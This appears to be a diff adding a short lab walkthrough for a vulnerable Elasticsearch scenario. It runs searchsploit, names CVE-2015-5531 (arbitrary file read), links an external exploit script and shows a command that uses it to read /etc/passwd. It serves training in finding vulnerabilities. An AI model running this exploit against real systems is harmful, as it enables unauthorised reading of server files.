@@ -1,0 +1,19 @@
+The main web page exposure the sensitive information about the version of Elasticsearch
+application. 
+
+The main of this scenario is to identify the vulnerability like in the real scenario
+
+sudo apt install exploitdb
+$sudo apt install libxml2-utils
+
+
+$searchsploit elasticsearch
+
+The vulnerability present in the current scenario, offers more details about 
+CVE-2015-5531- Arbitrary file Vulnerability. 
+
+Exploit can be found here:
+
+https://github.com/nixawk/labs/blob/master/CVE-2015-5531/exploit.py
+
+python exploit_elastic.py {url} /etc/passwd
